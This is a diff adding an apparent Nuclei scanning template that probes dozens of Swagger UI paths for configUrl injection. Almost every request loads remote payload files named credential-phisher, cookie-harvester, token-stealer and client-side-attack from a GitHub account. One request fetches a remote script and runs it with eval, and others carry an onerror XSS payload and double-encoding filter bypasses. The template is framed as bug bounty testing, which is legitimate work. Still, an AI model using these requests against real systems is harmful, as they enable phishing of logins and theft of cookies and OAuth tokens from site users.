@@ -1,0 +1,143 @@
+id: swagger-ui-advanced-vulnerabilities-test
+
+info:
+  name: Advanced Swagger UI Vulnerability Test Suite
+  author: CyberTechAjju
+  severity: high
+  description: Tests for multiple vulnerabilities in Swagger UI including config URL injection, XSS, HTML injection, and CSRF. This is a comprehensive testing suite for bug bounty hunters.
+  tags: swagger-ui,xss,html-injection,csrf,oauth-flow
+
+requests:
+  - method: GET
+    path:
+      # Basic configUrl injection paths
+      - '{{BaseURL}}/?configUrl=https://raw.githubusercontent.com/cyberajju/swagger-ui/main/payload-delivery.json'
+      - '{{BaseURL}}/index.html?configUrl=https://raw.githubusercontent.com/cyberajju/swagger-ui/main/payload-delivery.json'
+      - '{{BaseURL}}/swagger-ui?configUrl=https://raw.githubusercontent.com/cyberajju/swagger-ui/main/payload-delivery.json'
+      - '{{BaseURL}}/api/?configUrl=https://raw.githubusercontent.com/cyberajju/swagger-ui/main/payload-delivery.json'
+      - '{{BaseURL}}/docs/?configUrl=https://raw.githubusercontent.com/cyberajju/swagger-ui/main/payload-delivery.json'
+      
+      # Login credential harvesting paths
+      - '{{BaseURL}}/swagger-ui?configUrl=https://raw.githubusercontent.com/cyberajju/swagger-ui/main/credential-phisher.json'
+      - '{{BaseURL}}/api-docs?configUrl=https://raw.githubusercontent.com/cyberajju/swagger-ui/main/credential-phisher.json'
+      - '{{BaseURL}}/docs?configUrl=https://raw.githubusercontent.com/cyberajju/swagger-ui/main/credential-phisher.json'
+      
+      # Cookie stealing paths
+      - '{{BaseURL}}/swagger-ui?configUrl=https://raw.githubusercontent.com/cyberajju/swagger-ui/main/cookie-harvester.json'
+      - '{{BaseURL}}/api-docs?configUrl=https://raw.githubusercontent.com/cyberajju/swagger-ui/main/cookie-harvester.json'
+      
+      # OAuth flow exploitation
+      - '{{BaseURL}}/swagger-ui?configUrl=https://raw.githubusercontent.com/cyberajju/swagger-ui/main/token-stealer.json'
+      - '{{BaseURL}}/api-docs?configUrl=https://raw.githubusercontent.com/cyberajju/swagger-ui/main/token-stealer.json'
+      
+      # DOM-based XSS exploitation
+      - '{{BaseURL}}/swagger-ui?configUrl=https://raw.githubusercontent.com/cyberajju/swagger-ui/main/client-side-attack.json'
+      - '{{BaseURL}}/api-docs?configUrl=https://raw.githubusercontent.com/cyberajju/swagger-ui/main/client-side-attack.json'
+      - '{{BaseURL}}/swagger-ui?configUrl=https://raw.githubusercontent.com/cyberajju/swagger-ui/main/client-side-attack.json#<img src=x onerror=alert(document.domain)>'
+      
+      # Swagger UI-specific XSS exploitation  
+      - '{{BaseURL}}/swagger-ui?configUrl=https://raw.githubusercontent.com/cyberajju/swagger-ui/main/ui-object-poisoning.json'
+      - '{{BaseURL}}/api-docs?configUrl=https://raw.githubusercontent.com/cyberajju/swagger-ui/main/ui-object-poisoning.json'
+      
+      # Advanced DOM-based XSS
+      - '{{BaseURL}}/swagger-ui?configUrl=javascript:fetch("https://raw.githubusercontent.com/cyberajju/swagger-ui/main/script.js").then(r=>r.text()).then(eval)'
+      - '{{BaseURL}}/api-docs?configUrl=javascript:fetch("https://raw.githubusercontent.com/cyberajju/swagger-ui/main/script.js").then(r=>r.text()).then(eval)'
+      
+      # Double encoding to bypass filters
+      - '{{BaseURL}}/swagger-ui?configUrl=https://raw.githubusercontent.com/cyberajju/swagger-ui/main/payload-delivery.json%253Fa=1%2526b=2'
+      - '{{BaseURL}}/api-docs?configUrl=https://raw.githubusercontent.com/cyberajju/swagger-ui/main/payload-delivery.json%253Fa=1%2526b=2'
+      
+      # Common paths (from original file)
+      - '{{BaseURL}}/idm/v2/api-docs?configUrl=https://raw.githubusercontent.com/cyberajju/swagger-ui/main/payload-delivery.json'
+      - '{{BaseURL}}/docs/api-reference?configUrl=https://raw.githubusercontent.com/cyberajju/swagger-ui/main/payload-delivery.json'
+      - '{{BaseURL}}/swaggerui?configUrl=https://raw.githubusercontent.com/cyberajju/swagger-ui/main/payload-delivery.json'
+      - '{{BaseURL}}/api/help?configUrl=https://raw.githubusercontent.com/cyberajju/swagger-ui/main/payload-delivery.json'
+      - '{{BaseURL}}/doc?configUrl=https://raw.githubusercontent.com/cyberajju/swagger-ui/main/payload-delivery.json'
+      - '{{BaseURL}}/api-reference?configUrl=https://raw.githubusercontent.com/cyberajju/swagger-ui/main/payload-delivery.json'
+      - '{{BaseURL}}/swagger/docs/v1?configUrl=https://raw.githubusercontent.com/cyberajju/swagger-ui/main/payload-delivery.json'
+      - '{{BaseURL}}/reference?configUrl=https://raw.githubusercontent.com/cyberajju/swagger-ui/main/payload-delivery.json'
+      - '{{BaseURL}}/swagger/ui/index?configUrl=https://raw.githubusercontent.com/cyberajju/swagger-ui/main/payload-delivery.json'
+      - '{{BaseURL}}/swagger/index.html?configUrl=https://raw.githubusercontent.com/cyberajju/swagger-ui/main/payload-delivery.json'
+      - '{{BaseURL}}/swagger-ui.html?configUrl=https://raw.githubusercontent.com/cyberajju/swagger-ui/main/payload-delivery.json'
+      - '{{BaseURL}}/swagger/swagger-ui.html?configUrl=https://raw.githubusercontent.com/cyberajju/swagger-ui/main/payload-delivery.json'
+      - '{{BaseURL}}/api/swagger-ui.html?configUrl=https://raw.githubusercontent.com/cyberajju/swagger-ui/main/payload-delivery.json'
+      - '{{BaseURL}}/api-docs/?configUrl=https://raw.githubusercontent.com/cyberajju/swagger-ui/main/payload-delivery.json'
+      - '{{BaseURL}}/api/index.html?configUrl=https://raw.githubusercontent.com/cyberajju/swagger-ui/main/payload-delivery.json'
+      - '{{BaseURL}}/api/docs/?configUrl=https://raw.githubusercontent.com/cyberajju/swagger-ui/main/payload-delivery.json'
+      - '{{BaseURL}}/api/swagger/index.html?configUrl=https://raw.githubusercontent.com/cyberajju/swagger-ui/main/payload-delivery.json'
+      - '{{BaseURL}}/api/swagger/swagger-ui.html?configUrl=https://raw.githubusercontent.com/cyberajju/swagger-ui/main/payload-delivery.json'
+      - '{{BaseURL}}/api/swagger-ui/api-docs?configUrl=https://raw.githubusercontent.com/cyberajju/swagger-ui/main/payload-delivery.json'
+      - '{{BaseURL}}/api/api-docs?configUrl=https://raw.githubusercontent.com/cyberajju/swagger-ui/main/payload-delivery.json'
+      - '{{BaseURL}}/api/apidocs?configUrl=https://raw.githubusercontent.com/cyberajju/swagger-ui/main/payload-delivery.json'
+      - '{{BaseURL}}/api/swagger?configUrl=https://raw.githubusercontent.com/cyberajju/swagger-ui/main/payload-delivery.json'
+      - '{{BaseURL}}/api/swagger/static/index.html?configUrl=https://raw.githubusercontent.com/cyberajju/swagger-ui/main/payload-delivery.json'
+      - '{{BaseURL}}/api/swagger-resources?configUrl=https://raw.githubusercontent.com/cyberajju/swagger-ui/main/payload-delivery.json'
+      - '{{BaseURL}}/api/swagger-resources/restservices/v2/api-docs?configUrl=https://raw.githubusercontent.com/cyberajju/swagger-ui/main/payload-delivery.json'
+      - '{{BaseURL}}/api/__swagger__/?configUrl=https://raw.githubusercontent.com/cyberajju/swagger-ui/main/payload-delivery.json'
+      - '{{BaseURL}}/api/_swagger_/?configUrl=https://raw.githubusercontent.com/cyberajju/swagger-ui/main/payload-delivery.json'
+      - '{{BaseURL}}/api/spec?configUrl=https://raw.githubusercontent.com/cyberajju/swagger-ui/main/payload-delivery.json'
+      - '{{BaseURL}}/api/swagger/ui/index?configUrl=https://raw.githubusercontent.com/cyberajju/swagger-ui/main/payload-delivery.json'
+      - '{{BaseURL}}/__swagger__/?configUrl=https://raw.githubusercontent.com/cyberajju/swagger-ui/main/payload-delivery.json'
+      - '{{BaseURL}}/api/v2/doc?configUrl=https://raw.githubusercontent.com/cyberajju/swagger-ui/main/payload-delivery.json'
+      - '{{BaseURL}}/api/v1/?configUrl=https://raw.githubusercontent.com/cyberajju/swagger-ui/main/payload-delivery.json'
+      - '{{BaseURL}}/api/v1/doc?configUrl=https://raw.githubusercontent.com/cyberajju/swagger-ui/main/payload-delivery.json'
+      - '{{BaseURL}}/_swagger_/?configUrl=https://raw.githubusercontent.com/cyberajju/swagger-ui/main/payload-delivery.json'
+      - '{{BaseURL}}/swagger-resources/restservices/v2/api-docs?configUrl=https://raw.githubusercontent.com/cyberajju/swagger-ui/main/payload-delivery.json'
+      - '{{BaseURL}}/classicapi/doc/?configUrl=https://raw.githubusercontent.com/cyberajju/swagger-ui/main/payload-delivery.json'
+      - '{{BaseURL}}/api/v1/openapi?configUrl=https://raw.githubusercontent.com/cyberajju/swagger-ui/main/payload-delivery.json'
+      
+      # Tests for specific vulnerabilities
+      - '{{BaseURL}}/?configUrl[]=https://raw.githubusercontent.com/cyberajju/swagger-ui/main/payload-delivery.json'
+      - '{{BaseURL}}/?config.url=https://raw.githubusercontent.com/cyberajju/swagger-ui/main/payload-delivery.json'
+      
+      # Versioned paths
+      - '{{BaseURL}}/v0.12/index.html?configUrl=https://raw.githubusercontent.com/cyberajju/swagger-ui/main/payload-delivery.json'
+      - '{{BaseURL}}/v0.11/index.html?configUrl=https://raw.githubusercontent.com/cyberajju/swagger-ui/main/payload-delivery.json'
+      - '{{BaseURL}}/v0.10/index.html?configUrl=https://raw.githubusercontent.com/cyberajju/swagger-ui/main/payload-delivery.json'
+      - '{{BaseURL}}/v0.9/index.html?configUrl=https://raw.githubusercontent.com/cyberajju/swagger-ui/main/payload-delivery.json'
+      - '{{BaseURL}}/v0.8/index.html?configUrl=https://raw.githubusercontent.com/cyberajju/swagger-ui/main/payload-delivery.json'
+      - '{{BaseURL}}/v0.7/index.html?configUrl=https://raw.githubusercontent.com/cyberajju/swagger-ui/main/payload-delivery.json'
+      - '{{BaseURL}}/v0.6/index.html?configUrl=https://raw.githubusercontent.com/cyberajju/swagger-ui/main/payload-delivery.json'
+      - '{{BaseURL}}/v0.5/index.html?configUrl=https://raw.githubusercontent.com/cyberajju/swagger-ui/main/payload-delivery.json'
+      - '{{BaseURL}}/v0.4/index.html?configUrl=https://raw.githubusercontent.com/cyberajju/swagger-ui/main/payload-delivery.json'
+      - '{{BaseURL}}/v0.3/index.html?configUrl=https://raw.githubusercontent.com/cyberajju/swagger-ui/main/payload-delivery.json'
+      - '{{BaseURL}}/v0.2/index.html?configUrl=https://raw.githubusercontent.com/cyberajju/swagger-ui/main/payload-delivery.json'
+      - '{{BaseURL}}/v0.1/index.html?configUrl=https://raw.githubusercontent.com/cyberajju/swagger-ui/main/payload-delivery.json'
+      
+      # Additional endpoints (newer versions of Swagger/OpenAPI)
+      - '{{BaseURL}}/api/v3/api-docs?configUrl=https://raw.githubusercontent.com/cyberajju/swagger-ui/main/payload-delivery.json'
+      - '{{BaseURL}}/v3/api-docs?configUrl=https://raw.githubusercontent.com/cyberajju/swagger-ui/main/payload-delivery.json'
+      - '{{BaseURL}}/swagger-ui/index.html?configUrl=https://raw.githubusercontent.com/cyberajju/swagger-ui/main/payload-delivery.json'
+
+    redirects: true
+    max-redirects: 3
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "swagger-ui"            # Swagger UI specific identifier
+          - "swagger-initializer"   # Swagger UI common script
+          - "api-docs"              # Often present in API docs
+          - "swagger.json"          # Common in Swagger UI
+          - "\"urls\":"             # Present in our payload files
+          - "petstore.swagger.io"   # Common default URL in Swagger configurations
+          - "CyberTechAjju"         # Our author tag
+        condition: or
+
+      - type: status
+        status:
+          - 200
+          - 201
+          - 202
+          - 203
+
+    extractors:
+      - type: regex
+        name: api-version
+        part: body
+        regex:
+          - 'swagger-ui-([0-9.]+)'
+          - 'openapi-explorer-([0-9.]+)'
+
